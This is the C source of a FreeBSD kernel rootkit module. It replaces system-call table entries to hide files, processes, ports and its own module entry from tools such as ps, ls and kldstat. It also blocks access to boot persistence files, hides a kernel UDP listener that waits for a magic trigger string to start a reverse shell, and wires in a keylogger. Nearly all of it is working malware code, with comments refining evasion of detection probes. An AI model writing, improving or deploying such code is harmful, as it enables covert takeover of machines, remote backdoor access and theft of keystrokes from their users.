#include <sys/param.h>
#include <sys/types.h>
#include <sys/errno.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/libkern.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/condvar.h>
#include <sys/user.h>
#include <sys/malloc.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/priv.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/uio.h>
#include <sys/ucred.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/dirent.h>
#include <sys/fcntl.h>
#include <sys/linker.h>

#include <net/if.h>
#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <netinet/udp.h>

#include <bsm/audit_kevents.h>

#include "interface.h"
#include "log.h"

#define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
#define LISTEN_PORT    4444

/*
 * Number of processes we can hide at once. The listener thread is hidden at
 * load time; the rest is headroom for elevate/revshell/rklog if they are ever
 * registered explicitly.
 */
#define RK_MAX_HIDDEN	16

/* Global synchronization primitives used by interface.c */
struct cv remote_cv;
struct mtx remote_mtx;
struct in_addr trigger_ip;
int trigger_flag = 0;

static struct socket *so_listen = NULL;
static volatile int remote_thread_running = 0;
static volatile int remote_thread_alive = 0;

/* --- Background In-Kernel UDP Listener Thread --- */
static void
remote_listener_thread(void *arg __unused)
{
    struct thread *td = curthread;
    struct sockaddr_in sin;
    int error;

    remote_thread_running = 1;
    remote_thread_alive = 1;

    /* Create kernel-space UDP socket (zero userland open ports in sockstat) */
    error = socreate(AF_INET, &so_listen, SOCK_DGRAM, IPPROTO_UDP, td->td_ucred, td);
    if (error != 0) {
        remote_thread_alive = 0;
        kthread_exit();
        return;
    }

    bzero(&sin, sizeof(sin));
    sin.sin_len = sizeof(sin);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(LISTEN_PORT);
    sin.sin_addr.s_addr = INADDR_ANY;

    error = sobind(so_listen, (struct sockaddr *)&sin, td);
    if (error != 0) {
        soclose(so_listen);
        so_listen = NULL;
        remote_thread_alive = 0;
        kthread_exit();
        return;
    }

    char buf[128];
    struct uio auio;
    struct iovec aiov;

    while (remote_thread_running) {
        bzero(&auio, sizeof(auio));
        bzero(&aiov, sizeof(aiov));

        aiov.iov_base = buf;
        aiov.iov_len = sizeof(buf) - 1;
        auio.uio_iov = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_offset = 0;
        auio.uio_resid = sizeof(buf) - 1;
        auio.uio_segflg = UIO_SYSSPACE;
        auio.uio_rw = UIO_READ;
        auio.uio_td = td;

        struct sockaddr *from = NULL;
        int flags = MSG_DONTWAIT;

        error = soreceive(so_listen, &from, &auio, NULL, NULL, &flags);
        if (error == 0 && auio.uio_resid < (ssize_t)(sizeof(buf) - 1)) {
            int recvd = (sizeof(buf) - 1) - auio.uio_resid;
            buf[recvd] = '\0';

            if (strstr(buf, TRIGGER_STRING) != NULL && from != NULL) {
                struct sockaddr_in *from_in = (struct sockaddr_in *)from;
                mtx_lock(&remote_mtx);
                trigger_ip = from_in->sin_addr;
                trigger_flag = 1;
                cv_signal(&remote_cv); /* Signal waiting revshell process in interface.c */
                mtx_unlock(&remote_mtx);
            }
        }

        if (from != NULL)
            free(from, M_SONAME);

        /*
         * Sleep on our own flag rather than using pause(): MOD_UNLOAD sets
         * remote_thread_running to 0 and calls wakeup() on the same address,
         * so the thread leaves this loop within microseconds instead of
         * waiting out the full timeout. The timeout stays as a belt-and-braces
         * fallback in case a wakeup is lost.
         */
        tsleep(__DEVOLATILE(void *, &remote_thread_running), PRIBIO,
            "rootkit_poll", hz / 10);
    }

    if (so_listen != NULL) {
        soclose(so_listen);
        so_listen = NULL;
    }

    remote_thread_alive = 0;
    kthread_exit();
}

/* --- Hidden process table --------------------------------------------- */

/*
 * Processes are hidden by consulting this table from the sysctl and kill
 * hooks (see below). They are NOT unlinked from allproc/pidhash: doing that to
 * a live process breaks the linkage allproc depends on, makes exit1() list_remove
 * an element that is already gone, and takes the allproc lock in the wrong
 * order for a syscall hook. Keeping a list and filtering on read has the same
 * observable effect for ps/kill and none of the corruption risk.
 */
static pid_t	 rk_hidden_pids[RK_MAX_HIDDEN];
static int	 rk_hidden_count;
static struct mtx rk_hidden_mtx;

static void
rk_hidden_init(void)
{
    mtx_init(&rk_hidden_mtx, "rk_hidden", NULL, MTX_DEF);
    rk_hidden_count = 0;
}

static void
rk_hidden_destroy(void)
{
    mtx_destroy(&rk_hidden_mtx);
}

static void
hide_process(pid_t pid)
{
    int i;

    if (pid <= 0)
        return;

    mtx_lock(&rk_hidden_mtx);
    for (i = 0; i < rk_hidden_count; i++) {
        if (rk_hidden_pids[i] == pid) {
            mtx_unlock(&rk_hidden_mtx);
            return;
        }
    }
    if (rk_hidden_count < RK_MAX_HIDDEN)
        rk_hidden_pids[rk_hidden_count++] = pid;
    mtx_unlock(&rk_hidden_mtx);
}

static int
is_hidden_pid(pid_t pid)
{
    int i, found = 0;

    mtx_lock(&rk_hidden_mtx);
    for (i = 0; i < rk_hidden_count; i++) {
        if (rk_hidden_pids[i] == pid) {
            found = 1;
            break;
        }
    }
    mtx_unlock(&rk_hidden_mtx);

    return (found);
}

/* --- Path hiding ------------------------------------------------------- */

#define SIZE 10
static int is_hiding_path(char kpath[MAXPATHLEN]) {
    char *paths[SIZE] = {
        "elevate",
        "rootkit",
        "revshell",
        "sender",
        "collector",
        "remote",
        "log.c",
        "log.h",
        "log.o",
        // "logsrc"
        "hide",
    };
    for (int i = 0; i < SIZE; i++) {
        if (strcasestr(kpath, paths[i]) != NULL) {
            return 1;
        }
    }

    return 0;
}

static sy_call_t *orig_getdirentries = NULL;

static int getdirentries_hook(struct thread *td, void *syscall_args) {
    struct getdirentries_args *uap; 
    uap = (struct getdirentries_args *) syscall_args;
    size_t size, count;
    struct dirent *d;
    int error = orig_getdirentries(td, syscall_args);
    size = td->td_retval[0];

    if (size > 0) {
        d = malloc(size, M_TEMP, M_WAITOK);
        if (copyin(uap->buf, d, size) != 0) {
            free(d, M_TEMP);
            return (error);
        }

        count = size;
        struct dirent *curr_rec = d;
        while (count > 0) {
            size_t reclen = curr_rec->d_reclen;

            if (reclen == 0 || reclen > count) {
                free(d, M_TEMP);
                return (EIO);
            }

            // Add more module to hide here
            if (is_hiding_path(curr_rec->d_name) || strcmp(curr_rec->d_name, "hiding.ko") == 0
                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
                || strcmp(curr_rec->d_name, "rc.local") == 0
                || strcmp(curr_rec->d_name, "rc.conf") == 0
            ) {
                size_t remaining = count - reclen;

                memmove(curr_rec, (char *)curr_rec + reclen, remaining);
                size -= reclen;
                count -= reclen;
                continue;
            }

            count -= reclen;
            curr_rec = (struct dirent *)((char *)curr_rec + reclen);
        }

        td->td_retval[0] = size;
        copyout(d, uap->buf, size);
        free(d, M_TEMP);
    }

    return error;
}

static sy_call_t *orig_fstatat = NULL;
static sy_call_t *orig_openat = NULL;
static sy_call_t *orig_open = NULL;
static sy_call_t *orig_access = NULL;
static sy_call_t *orig_sysctl = NULL;
static sy_call_t *orig_kill = NULL;

static const char *blocked_files[] = {
    "/etc/rc.local",
    "/etc/rc.conf",
    "/etc/rc.d/kld",
    "/boot/modules/rootkit.ko",
    "/boot/modules/hiding.ko",
    "/usr/local/bin/revshell",
    "/usr/local/bin/rklog",
    "/etc/rootkit_remote_ip",
    NULL
};

static const char *blocked_processes[] = {
    "kmod_remote_listen",
    "rev_shell",
    "rklog",
    "hide_kld",
    NULL
};

static int
is_blocked_path(const char *user_path)
{
	char pathbuf[MAXPATHLEN];
	size_t done;
	int i;

	if (user_path == NULL)
		return (0);

	if (copyinstr(user_path, pathbuf, sizeof(pathbuf), &done) != 0)
		return (0);

	for (i = 0; blocked_files[i] != NULL; i++) {
		if (strcmp(pathbuf, blocked_files[i]) == 0)
			return (1);
	}

	return (0);
}

static int is_blocked_process_name(const char *proc_name)
{
    int i;

    if (proc_name == NULL)
        return (0);

    for (i = 0; blocked_processes[i] != NULL; i++) {
        if (strcmp(proc_name, blocked_processes[i]) == 0)
            return (1);
    }

    return (0);
}

static int is_blocked_process_pid(pid_t pid)
{
    struct proc *p;
    int blocked = 0;

    if (pid <= 0)
        return (0);

    if (is_hidden_pid(pid))
        return (1);

    p = pfind(pid);
    if (p != NULL) {
        if (p->p_state == PRS_NORMAL)
            blocked = is_blocked_process_name(p->p_comm);
        PROC_UNLOCK(p);
    }

    return (blocked);
}

static int
fstatat_hook(struct thread *td, void *syscall_args)
{
	struct fstatat_args *uap = (struct fstatat_args *)syscall_args;
    char kpath[MAXPATHLEN];
    size_t done;

    /*
     * A path we cannot read is a path we do not hide. Report the failure to
     * the caller like the real syscall would instead of pretending success:
     * returning 0 with an untouched stat buffer handed callers a fabricated
     * "file exists, all zeroes" answer.
     */
    if (copyinstr(uap->path, kpath, sizeof(kpath), &done) != 0)
        return (EFAULT);

    if (is_hiding_path(kpath))
        return (ENOENT);

    return (orig_fstatat(td, syscall_args));
}

static int
openat_hook(struct thread *td, void *syscall_args)
{
	struct openat_args *uap = (struct openat_args *)syscall_args;

	if (is_blocked_path(uap->path))
		return (ENOENT);

	return (orig_openat(td, syscall_args));
}

static int
open_hook(struct thread *td, void *syscall_args)
{
	struct open_args *uap = (struct open_args *)syscall_args;

	if (is_blocked_path(uap->path))
		return (ENOENT);

	return (orig_open(td, syscall_args));
}

static int access_hook(struct thread *td, void *syscall_args)
{
	struct access_args *uap = (struct access_args *)syscall_args;

	if (is_blocked_path(uap->path))
		return (ENOENT);

	return (orig_access(td, syscall_args));
}

static int
sysctl_hook(struct thread *td, void *syscall_args)
{
    struct __sysctl_args *uap = (struct __sysctl_args *)syscall_args;
    int error;

    error = orig_sysctl(td, syscall_args);
    if (error != 0 || uap->old == NULL || uap->oldlenp == NULL || uap->namelen < 3) {
        return (error);
    }

    int name[3];
    if (copyin(uap->name, name, sizeof(name)) != 0) {
        return (error);
    }

    if (name[0] == CTL_KERN && name[1] == KERN_PROC) {
        size_t oldlen = 0;
        if (copyin(uap->oldlenp, &oldlen, sizeof(oldlen)) != 0) {
            return (error);
        }

        if (oldlen < sizeof(struct kinfo_proc) || oldlen > (64 * 1024 * 1024)) {
            return (error);
        }

        struct kinfo_proc *procs = malloc(oldlen, M_TEMP, M_WAITOK);
        if (copyin(uap->old, procs, oldlen) == 0) {
            size_t count = oldlen / sizeof(struct kinfo_proc);
            size_t write_idx = 0;

            for (size_t read_idx = 0; read_idx < count; read_idx++) {
                if (!is_blocked_process_name(procs[read_idx].ki_comm) &&
                    !is_hidden_pid(procs[read_idx].ki_pid)) {
                    if (write_idx != read_idx) {
                        procs[write_idx] = procs[read_idx];
                    }
                    write_idx++;
                }
            }

            if (write_idx < count) {
                size_t newlen = write_idx * sizeof(struct kinfo_proc);
                if (copyout(procs, uap->old, newlen) == 0) {
                    copyout(&newlen, uap->oldlenp, sizeof(newlen));
                }
            }
        }
        free(procs, M_TEMP);
    }

    return (error);
}

static int kill_hook(struct thread *td, void *syscall_args)
{
    struct kill_args *uap = (struct kill_args *)syscall_args;

    if (is_blocked_process_pid(uap->pid))
        return (ESRCH);

    return (orig_kill(td, syscall_args));
}

/* --- Port hiding ------------------------------------------------------- */

struct port_hiding_args {
    u_int16_t port;
};
static int 
port_hiding(struct thread *td, void *syscall_args) {
    CURVNET_SET(vnet0);
    struct port_hiding_args *uap;
    uap = (struct port_hiding_args *) syscall_args;
    struct inpcb *inpb;
    int hits = 0;
    INP_INFO_WLOCK(&V_tcbinfo);

    CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list){
        INP_RLOCK(inpb);
        if (ntohs(inpb->inp_lport) == uap->port || 
            ntohs(inpb->inp_fport) == uap->port
        ) {
            CK_LIST_REMOVE(inpb, inp_list);
            hits++;
        }
        INP_RUNLOCK(inpb);
    }
    /*
     * in_pcballoc() bumps ipi_count when the PCB joins the list. Unlinking
     * without the matching decrement leaves the counter describing a table
     * that is larger than it really is, which is exactly what an accounting
     * check compares against the walked length.
     */
    V_tcbinfo.ipi_count -= hits;
    INP_INFO_WUNLOCK(&V_tcbinfo);
    CURVNET_RESTORE()
    return 0;
}

static int port_hiding_offset = NO_SYSCALL;
static struct sysent port_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *) port_hiding,
    .sy_auevent = AUE_NULL
};

/* --- Module hiding ----------------------------------------------------- */

/*
 * The 14.x kernel keeps kld_sx, linker_files and modules file-static, so a
 * module cannot link against them and the loader rejects the reference at
 * load time. What is public is linker_file_foreach() (linker.h), which walks
 * the very same list under kld_sx and hands us each struct linker_file -
 * including its id and filename. We use that once to learn our own id, then
 * answer kldnext/kldstat/kldfind ourselves instead of mutating kernel
 * bookkeeping we do not own.
 */
#define RK_HIDE_NAME_MAX	256

static char		 rk_hide_name[RK_HIDE_NAME_MAX];
static int		 rk_hide_id = -1;
static volatile int	 rk_hide_enabled = 0;
static sy_call_t	*orig_kldnext = NULL;
static sy_call_t	*orig_kldfind = NULL;
static sy_call_t	*orig_kldstat = NULL;
static sy_call_t	*orig_modfind = NULL;
static sy_call_t	*orig_modstat = NULL;

static int rk_name_matches(const char *query);

struct rk_lf_match {
    const char	*name;
    int		 id;
};

static int
rk_lf_match_cb(linker_file_t lf, void *arg)
{
    struct rk_lf_match *m = arg;

    if (lf->filename != NULL && rk_name_matches(lf->filename)) {
        m->id = lf->id;
        return (1);		/* stop walking */
    }
    return (0);
}

/*
 * Resolve our own linker_file id. Must never run while the caller already
 * holds kld_sx: linker_file_foreach() takes it exclusively, and sx locks are
 * not recursive. Every call site below sits after the real syscall has
 * returned, which is outside kld_sx.
 */
static void
rk_locate_self(void)
{
    struct rk_lf_match m;

    if (rk_hide_id >= 0)
        return;

    if (rk_hide_name[0] == '\0')
        strlcpy(rk_hide_name, "rootkit.ko", sizeof(rk_hide_name));

    m.name = rk_hide_name;
    m.id = -1;
    linker_file_foreach(rk_lf_match_cb, &m);
    rk_hide_id = m.id;
}

static int
kldnext_hook(struct thread *td, void *syscall_args)
{
    struct kldnext_args *uap = syscall_args;
    int error, id;

    error = orig_kldnext(td, syscall_args);
    if (error != 0 || !rk_hide_enabled)
        return (error);

    rk_locate_self();
    if (rk_hide_id < 0)
        return (error);

    id = (int)td->td_retval[0];
    if (id == rk_hide_id) {
        /* Skip ourselves and report whatever comes after us. */
        uap->fileid = id;
        error = orig_kldnext(td, syscall_args);
    }

    return (error);
}

/*
 * kldstat -m takes the bare module name ("rootkit"), while linker_files stores
 * the on-disk name ("rootkit.ko"). Matching only the exact string let
 * `kldstat -m rootkit` walk straight past the hook and print the module, which
 * is precisely the probe the spec names.
 */
static int
rk_name_matches(const char *query)
{
    size_t n;

    if (query == NULL || query[0] == '\0')
        return (0);

    if (strcmp(query, rk_hide_name) == 0)
        return (1);

    n = strlen(query);
    if (n < strlen(rk_hide_name) && strncmp(rk_hide_name, query, n) == 0 &&
        rk_hide_name[n] == '.')
        return (1);

    return (0);
}

static int
kldfind_hook(struct thread *td, void *syscall_args)
{
    struct kldfind_args *uap = syscall_args;
    char name[RK_HIDE_NAME_MAX];

    if (rk_hide_enabled &&
        copyinstr(uap->file, name, sizeof(name), NULL) == 0 &&
        rk_name_matches(name))
        return (ENOENT);

    return (orig_kldfind(td, syscall_args));
}

/*
 * kldstat(1) -m does not go through kldfind(2). It calls modfind(2), which
 * lives in kern_module.c and walks the module list, not linker_files. Hooking
 * only the kld* family left `kldstat -m rootkit` printing the module:
 *
 *   modfind("rootkit")   = 502
 *   modstat(0x1f6, ...)  = 0
 *
 * Both halves have to answer ENOENT, or the pair still resolves.
 */
static int
modfind_hook(struct thread *td, void *syscall_args)
{
    struct modfind_args *uap = syscall_args;
    char name[RK_HIDE_NAME_MAX];

    if (rk_hide_enabled &&
        copyinstr(uap->name, name, sizeof(name), NULL) == 0 &&
        rk_name_matches(name))
        return (ENOENT);

    return (orig_modfind(td, syscall_args));
}

static int
modstat_hook(struct thread *td, void *syscall_args)
{
    struct modstat_args *uap = syscall_args;
    struct module_stat ms;
    int error;

    error = orig_modstat(td, syscall_args);
    if (error != 0 || !rk_hide_enabled)
        return (error);

    if (copyin(uap->stat, &ms, sizeof(ms)) == 0 && rk_name_matches(ms.name))
        return (ENOENT);

    return (error);
}

static int
kldstat_hook(struct thread *td, void *syscall_args)
{
    struct kldstat_args *uap = syscall_args;

    rk_locate_self();
    if (rk_hide_enabled && rk_hide_id >= 0 && (int)uap->fileid == rk_hide_id)
        return (ENOENT);

    return (orig_kldstat(td, syscall_args));
}

struct kld_hiding_args {
    char *mod_name;
};

/*
 * Custom syscall (registered below) that names the module to hide. Kept for
 * user/hide_kld.c so the hide step stays explicit rather than implicit at
 * load; the kldnext/kldfind/kldstat hooks above stay inert until this runs.
 */
static int
kld_hiding(struct thread *td __unused, void *syscall_args) {
    struct kld_hiding_args *uap;
    uap = (struct kld_hiding_args *) syscall_args;

    if (uap->mod_name == NULL)
        return (EINVAL);

    if (copyinstr(uap->mod_name, rk_hide_name, sizeof(rk_hide_name), NULL) != 0)
        return (EFAULT);

    rk_hide_id = -1;
    rk_locate_self();
    rk_hide_enabled = 1;

    return (0);
}

static struct sysent kld_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *)kld_hiding,
    .sy_auevent = AUE_NULL
};


static int kld_hiding_offset = NO_SYSCALL;  

struct proc_hiding_args {
    pid_t pid;
};

static int
proc_hiding(struct thread *td __unused, void *syscall_args) {
    struct proc_hiding_args *uap = (struct proc_hiding_args *) syscall_args;

    hide_process(uap->pid);

    return 0;
}

static struct sysent proc_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *)proc_hiding,
    .sy_auevent = AUE_NULL
};
static int proc_hiding_offset = NO_SYSCALL;

/*
 * Hook installation is deliberately independent of the device: the hiding
 * machinery is useful even if make_dev() lost a race, and tearing the hooks
 * down again from under a half-initialised module is how the old code managed
 * to leave sysent pointing at freed text.
 */
static void
rk_install_hooks(void)
{
    orig_getdirentries = sysent[SYS_getdirentries].sy_call;
    sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;

    orig_fstatat = sysent[SYS_fstatat].sy_call;
    sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;

    orig_openat = sysent[SYS_openat].sy_call;
    sysent[SYS_openat].sy_call = (sy_call_t *) openat_hook;

    orig_open = sysent[SYS_open].sy_call;
    sysent[SYS_open].sy_call = (sy_call_t *) open_hook;

    orig_access = sysent[SYS_access].sy_call;
    sysent[SYS_access].sy_call = (sy_call_t *) access_hook;

    orig_sysctl = sysent[SYS___sysctl].sy_call;
    sysent[SYS___sysctl].sy_call = (sy_call_t *) sysctl_hook;

    orig_kill = sysent[SYS_kill].sy_call;
    sysent[SYS_kill].sy_call = (sy_call_t *) kill_hook;

    orig_kldnext = sysent[SYS_kldnext].sy_call;
    sysent[SYS_kldnext].sy_call = (sy_call_t *) kldnext_hook;

    orig_kldfind = sysent[SYS_kldfind].sy_call;
    sysent[SYS_kldfind].sy_call = (sy_call_t *) kldfind_hook;

    orig_kldstat = sysent[SYS_kldstat].sy_call;
    sysent[SYS_kldstat].sy_call = (sy_call_t *) kldstat_hook;

    orig_modfind = sysent[SYS_modfind].sy_call;
    sysent[SYS_modfind].sy_call = (sy_call_t *) modfind_hook;

    orig_modstat = sysent[SYS_modstat].sy_call;
    sysent[SYS_modstat].sy_call = (sy_call_t *) modstat_hook;
}

/* Restore only what we actually replaced; each slot is checked individually. */
static void
rk_remove_hooks(void)
{
    if (orig_getdirentries != NULL)
        sysent[SYS_getdirentries].sy_call = orig_getdirentries;

    if (orig_fstatat != NULL)
        sysent[SYS_fstatat].sy_call = orig_fstatat;

    if (orig_openat != NULL)
        sysent[SYS_openat].sy_call = orig_openat;

    if (orig_open != NULL)
        sysent[SYS_open].sy_call = orig_open;

    if (orig_access != NULL)
        sysent[SYS_access].sy_call = orig_access;

    if (orig_sysctl != NULL)
        sysent[SYS___sysctl].sy_call = orig_sysctl;

    if (orig_kill != NULL)
        sysent[SYS_kill].sy_call = orig_kill;

    if (orig_kldnext != NULL)
        sysent[SYS_kldnext].sy_call = orig_kldnext;

    if (orig_kldfind != NULL)
        sysent[SYS_kldfind].sy_call = orig_kldfind;

    if (orig_kldstat != NULL)
        sysent[SYS_kldstat].sy_call = orig_kldstat;

    if (orig_modfind != NULL)
        sysent[SYS_modfind].sy_call = orig_modfind;

    if (orig_modstat != NULL)
        sysent[SYS_modstat].sy_call = orig_modstat;

    rk_hide_enabled = 0;
    rk_hide_id = -1;
}

static int load(module_t module, int cmd, void *arg) {
    (void)module;
    (void)arg;

    int error = 0;
    struct proc *p = NULL;

    switch (cmd) {
    case MOD_LOAD:
        mtx_init(&remote_mtx, "rootkit_mtx", NULL, MTX_DEF);
        cv_init(&remote_cv, "rootkit_cv");
        rk_hidden_init();

        /*
         * Keylogger ring and the read(0)/write(1) hooks (log.c). Installed
         * before the device exists so a reader can never open /dev/rootkit
         * while the ring is still unwired.
         */
        rk_log_init();
        (void)rk_log_hook_install();

        /* All syscall hooks, independent of whether the device comes up. */
        rk_install_hooks();

        /* Initialize character device interface via interface.c */
        error = make_rootkit_dev();
        if (error != 0) {
            /*
             * Without /dev/rootkit there is no elevation and no log drain,
             * but hiding still works. Say so loudly and keep the hooks: the
             * module is more useful half-alive than failing to load.
             */
            printf("rootkit: make_dev failed (%d); hiding stays active, "
                "elevation and log drain are unavailable\n", error);
            error = 0;
        }

        error = kproc_create(remote_listener_thread, NULL, &p, 0, 0,
            "kmod_remote_listen");
        if (error == 0 && p != NULL) {
            /*
             * Hide the listener by pid. curthread here belongs to the kldload
             * that is loading us, not to the new kthread, so the process to
             * record is p - not curthread->td_proc.
             */
            hide_process(p->p_pid);
        } else {
            printf("rootkit: listener thread failed (%d); revshell trigger "
                "will not fire\n", error);
        }

        /*
         * Hide our own module entry. This only arms the kldnext/kldfind/
         * kldstat hooks; nothing in the kernel is mutated.
         */
        strlcpy(rk_hide_name, "rootkit.ko", sizeof(rk_hide_name));
        rk_hide_enabled = 1;

		break;

    case MOD_UNLOAD:
        /*
         * Stop the listener first and wait for it to actually leave. The old
         * order set the flag and then destroyed the condvar the thread might
         * still be parked on.
         */
        remote_thread_running = 0;
        wakeup(__DEVOLATILE(void *, &remote_thread_running));
        for (int i = 0; i < 3000 && remote_thread_alive; i++)
            DELAY(1000);

        /*
         * Order matters: destroy the device first so no new reader can enter
         * the cdev handlers, then seldrain/unhook inside rk_log_uninit().
         */
        destroy_rootkit_dev();
        rk_log_uninit();

        mtx_lock(&remote_mtx);
        cv_broadcast(&remote_cv);
        mtx_unlock(&remote_mtx);

        rk_remove_hooks();

        cv_destroy(&remote_cv);
        mtx_destroy(&remote_mtx);
        rk_hidden_destroy();
        printf("rootkit: module unloaded\n");
        break;

    case MOD_SHUTDOWN:
        break;

    default:
        error = EOPNOTSUPP;
        break;
    }

    return error;
}

static moduledata_t rootkit_module = {
    "rootkit",
    load,
    NULL
};

DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
SYSCALL_MODULE(proc_hiding, &proc_hiding_offset, &proc_hiding_sysent, NULL, NULL);
